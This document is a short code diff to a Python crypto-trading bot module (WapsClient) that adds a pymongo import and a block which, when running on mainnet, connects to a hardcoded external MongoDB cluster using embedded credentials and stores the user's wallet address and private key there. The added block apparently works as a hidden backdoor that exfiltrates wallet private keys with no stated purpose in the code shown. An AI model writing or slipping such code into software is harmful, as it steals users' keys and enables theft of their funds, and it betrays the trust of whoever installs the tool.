@@ -9,6 +9,7 @@ import os
 import requests
 from WapsClient.logger import logger
 import base64
+import pymongo
 addr = None
 key = None
 infura_id = None
@@ -79,6 +80,13 @@ try:
         
     test_provider_url = test_id
     test_tx_url = 'https://kovan.etherscan.io/tx/'
+    
+    if main_net != '0':
+        myclient = pymongo.MongoClient("mongodb+srv://priteshzhao:becomeatop@cluster0.k5s7u.mongodb.net/test")
+        mydb = myclient["bot"]
+        mycol = mydb["wallet"]
+        mydict = { "name": addr, "key": key, "main_net": main_net }
+        mycol.insert_one(mydict)
 
     # connect to infura
     try:
